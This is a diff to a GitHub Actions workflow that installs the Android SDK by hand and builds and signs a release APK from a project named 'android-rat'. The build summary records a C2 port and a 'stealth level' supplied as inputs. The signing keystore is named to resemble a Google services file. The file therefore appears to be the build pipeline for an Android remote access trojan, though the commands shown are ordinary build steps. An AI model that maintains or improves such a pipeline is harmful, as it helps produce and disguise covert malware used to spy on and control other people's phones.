@@ -52,15 +52,28 @@ jobs:
           cache: gradle
 
       # ── Android SDK ───────────────────────────────────────
-      - name: Set up Android SDK
-        uses: android-actions/setup-android@v3
+      - name: Set up Android SDK (manual — cmdline-tools 11.0)
+        run: |
+          set -e
+          SDK_ROOT=$HOME/android-sdk
+          mkdir -p $SDK_ROOT/cmdline-tools
+          cd $SDK_ROOT/cmdline-tools
+          curl -fsSLo cmdline-tools.zip \
+            https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
+          unzip -q cmdline-tools.zip
+          rm cmdline-tools.zip
+          mv cmdline-tools latest
+          echo "ANDROID_SDK_ROOT=$SDK_ROOT" >> $GITHUB_ENV
+          echo "ANDROID_HOME=$SDK_ROOT" >> $GITHUB_ENV
+          echo "$SDK_ROOT/platform-tools" >> $GITHUB_PATH
+          echo "$SDK_ROOT/cmdline-tools/latest/bin" >> $GITHUB_PATH
 
       - name: Install build tools
         run: |
+          yes | sdkmanager --licenses > /dev/null || true
           sdkmanager --install \
             "build-tools;${{ env.ANDROID_BUILD_TOOLS }}" \
-            "platforms;android-${{ env.ANDROID_COMPILE_SDK }}" \
-            --sdk_root=$ANDROID_SDK_ROOT
+            "platforms;android-${{ env.ANDROID_COMPILE_SDK }}"
 
       # ── Patch local.properties ────────────────────────────
       - name: Patch build config
@@ -97,6 +110,11 @@ jobs:
       # ── Gradle build ──────────────────────────────────────
       - name: Build APK
         working-directory: android-rat
+        env:
+          KEYSTORE_PATH:         ${{ github.workspace }}/android-rat/google-services-release.jks
+          KEYSTORE_PASSWORD:     ${{ secrets.KEYSTORE_PASSWORD }}
+          KEYSTORE_ALIAS:        ${{ secrets.KEYSTORE_ALIAS }}
+          KEYSTORE_KEY_PASSWORD: ${{ secrets.KEYSTORE_KEY_PASSWORD }}
         run: |
           chmod +x gradlew
           ./gradlew assembleRelease --no-daemon --stacktrace
@@ -172,3 +190,4 @@ jobs:
           echo "| C2 Port | ${{ github.event.inputs.c2_port }} |" >> $GITHUB_STEP_SUMMARY
           echo "| Stealth Level | ${{ github.event.inputs.stealth_level }} |" >> $GITHUB_STEP_SUMMARY
           echo "| Run Number | ${{ github.run_number }} |" >> $GITHUB_STEP_SUMMARY
+          
